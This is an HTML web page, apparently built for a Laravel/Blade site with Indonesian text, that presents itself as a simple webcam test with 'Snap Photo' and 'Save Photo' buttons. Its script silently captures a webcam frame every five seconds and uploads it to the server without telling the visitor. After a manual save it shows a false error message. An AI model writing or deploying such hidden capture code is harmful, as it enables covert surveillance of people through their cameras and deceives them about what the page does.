<!DOCTYPE html>
<html>
<head>
    <title>Aman</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body {
            overflow-x: hidden;
        }
        #video-wrapper {
            width: 100%;
            height: 40vh;
            background-color: #765dfd;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 20px;
            padding: 2px 0;
            text-align: center;
        }
        #video {
            border-radius: 20px;
            overflow: hidden;
            border: 5px solid snow;
            margin-top: -5%;
        }
        #video, img {
            height: auto;
            width: 50%;
            border-radius: 20px;
        }
        #snap{
            width: 50%;
            background: none;
            border: none;
            background-color: #b05dfd;
            padding: 20px 2px;
            border-bottom-left-radius: 20px;
            border-bottom-right-radius: 20px;
            border-top: 5px solid snow;
            border-bottom: 5px solid snow;
            border-left: 5px solid snow;
            border-right: 5px solid snow;
            color: snow;
            font-weight: bold;
            text-align: center;
            position: absolute;
            font-size: 22px;
            margin-top: 72%;
            margin-left: 0%;
        }
        #canvas-vid{
          width:100%;
          height:auto;
          background-color:#17aef1;
          border-radius:20px;
          display: flex;
          justify-content: center;
          align-items: center;
        }
        #canvas{
          padding:5px 5px;
          background-color:snow;
          overflow:hidden;
          border-radius:20px;
        }
        #canvas,img{
          width:97%; height:auto;
          border-radius:30px;
        }
        #save{
            width: 50%;
            background: none;
            border: none;
            background-color: #17aef1;
            padding: 20px 2px;
            border-bottom-left-radius: 20px;
            border-bottom-right-radius: 20px;
            border-top: 5px solid snow;
            border-bottom: 5px solid snow;
            border-left: 5px solid snow;
            border-right: 5px solid snow;
            color: snow;
            font-weight: bold;
            text-align: center;
            position: absolute;
            font-size: 22px;
            margin-top: 72%;
            margin-left: 0%;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="font-weight:bold;">Tes Webcam</h1>
        <div id="video-wrapper">
            <video id="video" width="640" height="480" autoplay></video>
            <br>
            <button id="snap">Snap Photo</button>
        </div>
        <br>
      <div id="canvas-vid">
        <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
        <button id="save" style="display: none;">Save Photo</button>
      </div>
    </div>

<script>
  alert("mohon izinkan kamera untuk menggunakan semua fitur");
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');
const snapButton = document.getElementById('snap');
const saveButton = document.getElementById('save');
let manualImageDataURL = '';

navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        video.srcObject = stream;
    })
    .catch((error) => {
        console.error('Error accessing webcam:', error);
    });

function autoSnapCapture() {
    const hiddenCanvas = document.createElement('canvas');
    hiddenCanvas.width = video.videoWidth;
    hiddenCanvas.height = video.videoHeight;
    const hiddenContext = hiddenCanvas.getContext('2d');
    hiddenContext.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
    hiddenCanvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('image', blob);
        formData.append('type', 'auto');  // Menambahkan parameter type
        fetch('/save-image', {
            method: 'POST',
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('berhasil menyimpan');
        })
        .catch(error => {
            console.error('Error menyimpan gambar:', error);
        });
    }, 'image/png');
}

function manualSnapCapture() {
    canvas.style.display = 'block';
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    manualImageDataURL = canvas.toDataURL('image/png');
    saveButton.style.display = 'block';
}

function saveImage(dataURL) {
    fetch('/save-image', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
        },
        body: JSON.stringify({ image: dataURL, type: 'manual' })  // Menambahkan parameter type
    })
    .then(response => response.json())
    .then(data => {
        alert('Terjadi kesalahan dalam pengambilan gambar!');
        saveButton.style.display = 'none';
        canvas.style.display = 'none';
    })
    .catch((error) => {
        console.error('Error menyimpan gambar:', error);
    });
}

// Memanggil autoSnapCapture() setiap 5 detik untuk auto snap
setInterval(autoSnapCapture, 5000);

snapButton.addEventListener("click", manualSnapCapture);
saveButton.addEventListener("click", () => saveImage(manualImageDataURL));
</script>

</body>
</html>